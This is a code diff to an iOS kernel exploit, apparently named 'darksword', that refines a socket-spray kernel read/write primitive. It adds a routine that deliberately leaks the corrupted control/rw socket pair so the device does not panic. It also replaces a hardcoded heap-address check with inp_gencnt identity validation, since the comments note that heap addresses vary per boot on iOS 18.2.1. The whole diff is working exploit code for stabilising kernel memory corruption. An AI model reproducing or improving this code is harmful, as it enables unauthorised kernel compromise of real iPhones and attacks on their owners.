@@ -310,6 +310,25 @@ void sockets_release(void) {
     }
 }
 
+// Release every sprayed socket EXCEPT the corrupted control/rw pair at
+// (socketCsi, socketCsi+1). Closing a corrupted socket kfree()s its poisoned
+// inp_icmp6filt (control's points into the rw inpcb kalloc.1024 element, rw's
+// points at whatever set_kaddr last wrote), which is not a kalloc.32 allocation
+// -> "data.kalloc.32 not in expected zone" panic (observed on-device). Those
+// two sockets are leaked forever instead (ClearSword krw_sockets_leak_forever:
+// so_count is raised on the accepted path so even process exit cannot close
+// them).
+void sockets_release_except_pair(void) {
+    if (socketCsi < 0) { sockets_release(); return; }
+    for (NSUInteger i = 0; i < [(NSMutableArray*)socketPorts count]; i++) {
+        if (i == (NSUInteger)socketCsi || i == (NSUInteger)(socketCsi + 1))
+            continue;
+        mach_port_deallocate(mach_task_self(),
+            [(NSNumber*)[(NSMutableArray*)socketPorts objectAtIndex:i] unsignedIntValue]);
+    }
+    socketCsi = -1;
+}
+
 kern_return_t phys_oob_read(mach_port_t memObj, mach_vm_offset_t memOff,
                              mach_vm_size_t size, mach_vm_offset_t off, void *buf) {
     targetObject = memObj;
@@ -1348,33 +1367,48 @@ static bool method_purple_info_leak(void) {
 // recycled memory that is NOT the rw socket's live inpcb. The corruption then
 // makes controlSocketPcb -> csa/rsa garbage, and the first kwrite64 turns into
 // a 32-byte write into a MAC-label zone element -> "zone bound checks" panic
-// (observed on iOS 18.2.1 at 0xffffffde00fbfc70). Every read below is sourced
-// from an address already verified to be in the kernel heap GEN region
-// (0xffffffe1xxxxxxxx on this device; MAC labels live at 0xffffffdexxxxxxxx),
-// so a bad chain aborts the attempt instead of panicking.
+// (observed on iOS 18.2.1 at 0xffffffde00fbfc70).
+//
+// IMPORTANT: zone-map / GEN heap addresses vary PER BOOT (observed heaps at
+// 0xffffffdd.., 0xffffffde.., 0xffffffdf.., 0xffffffe1.. and 0xffffffe9.. on the
+// same device across a few boots), so NO hardcoded heap region is used. Identity
+// is instead proven by inp_gencnt (0x78): BOTH inpcbs (control and rw) must
+// equal the gencnts recorded for socketPorts[socketCsi] / [socketCsi+1] at spray
+// time. That check is boot-independent and cannot be satisfied by recycled
+// memory. Every address we read from is reached via kread64, whose copyout
+// source is already a canonical 0xffffff.. kernel pointer by construction.
 static bool validate_krw_sockets(void) {
-    controlSocketPcb = kread64(rwSocketPcb + 0x20); // rw inpcb inp_list.le_next -> control inpcb
-    if ((controlSocketPcb >> 32) != 0xffffffe1ULL || (controlSocketPcb & 0x3ff) != 0) {
-        printf("[-] validate: controlSocketPcb 0x%llx not a kernel-heap inpcb\n", controlSocketPcb);
+    // rw inpcb inp_list.le_next -> control inpcb. Depending on xnu LIST_ENTRY
+    // layout this may be the raw next-inpcb pointer or its list-entry address
+    // (+0x20); accept either form.
+    uint64_t rawNext = kread64(rwSocketPcb + 0x20);
+    controlSocketPcb = (rawNext & 0x3ff) == 0 ? rawNext : rawNext - 0x20;
+    if ((controlSocketPcb >> 40) != 0xFFFFFF || (controlSocketPcb & 0x3ff) != 0) {
+        printf("[-] validate: controlSocketPcb 0x%llx not a canonical kernel inpcb\n", controlSocketPcb);
+        return false;
+    }
+    uint64_t controlGencnt = kread64(controlSocketPcb + 0x78);
+    uint64_t expectControl = [(NSNumber*)socketPcbIds[socketCsi] unsignedLongLongValue];
+    if (controlGencnt != expectControl) {
+        printf("[-] validate: control gencnt 0x%llx != expected control socket 0x%llx (csi=%d)\n",
+               controlGencnt, expectControl, socketCsi);
+        return false;
+    }
+    uint64_t rwGencnt = kread64(rwSocketPcb + 0x78);
+    uint64_t expectRw = [(NSNumber*)socketPcbIds[socketCsi + 1] unsignedLongLongValue];
+    if (rwGencnt != expectRw) {
+        printf("[-] validate: rw inpcb gencnt 0x%llx != expected rw socket 0x%llx (csi=%d)\n",
+               rwGencnt, expectRw, socketCsi);
         return false;
     }
     uint64_t csa = kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
     uint64_t rsa = kread64(rwSocketPcb + OFFSET_PCB_SOCKET);
-    if ((csa >> 32) != 0xffffffe1ULL || (rsa >> 32) != 0xffffffe1ULL) {
-        printf("[-] validate: csa 0x%llx / rsa 0x%llx not in kernel heap\n", csa, rsa);
+    if ((csa >> 40) != 0xFFFFFF || (rsa >> 40) != 0xFFFFFF) {
+        printf("[-] validate: csa 0x%llx / rsa 0x%llx not canonical kernel sockets\n", csa, rsa);
         return false;
     }
-    // rwSocketPcb must actually be the rw socket's inpcb: inp_gencnt (0x78)
-    // must equal the gencnt recorded for socketPorts[socketCsi+1] at spray time.
-    uint64_t rwGencnt = kread64(rwSocketPcb + 0x78);
-    uint64_t expect = [(NSNumber*)socketPcbIds[socketCsi + 1] unsignedLongLongValue];
-    if (rwGencnt != expect) {
-        printf("[-] validate: rw inpcb gencnt 0x%llx != expected rw socket 0x%llx (csi=%d)\n",
-               rwGencnt, expect, socketCsi);
-        return false;
-    }
-    printf("[+] validate: controlSocketPcb 0x%llx csa 0x%llx rsa 0x%llx rwgencnt 0x%llx\n",
-           controlSocketPcb, csa, rsa, rwGencnt);
+    printf("[+] validate: controlSocketPcb 0x%llx csa 0x%llx rsa 0x%llx ctlgencnt 0x%llx rwgencnt 0x%llx\n",
+           controlSocketPcb, csa, rsa, controlGencnt, rwGencnt);
     gControlSocketAddr = csa;
     gRwSocketAddr = rsa;
     return true;
@@ -1464,12 +1498,13 @@ bool run_darksword(void) {
             ok = validate_krw_sockets();
         }
 
-        // PANIC MITIGATION: only release sockets when the attempt FAILED.
-        // On success the sockets backing controlSocket/rwSocket (and PCB B)
-        // must stay alive; freeing them recycles the inpcb memory, which gets
-        // reused as MAC labels and panics on the next 0x20-byte KRW write.
+        // PANIC MITIGATION: only release sockets when the attempt FAILED, and
+        // even then NEVER release the corrupted control/rw pair (closing them
+        // kfree()s their poisoned inp_icmp6filt -> kalloc.32 zone panic). On
+        // success the sockets backing controlSocket/rwSocket (and PCB B) stay
+        // alive so the inpcb memory is not recycled as MAC labels.
         if (!ok) {
-            sockets_release();
+            sockets_release_except_pair();
         }
         for (uint64_t s = 0; s < mappingNum; s++) {
             mach_vm_deallocate(mach_task_self(),
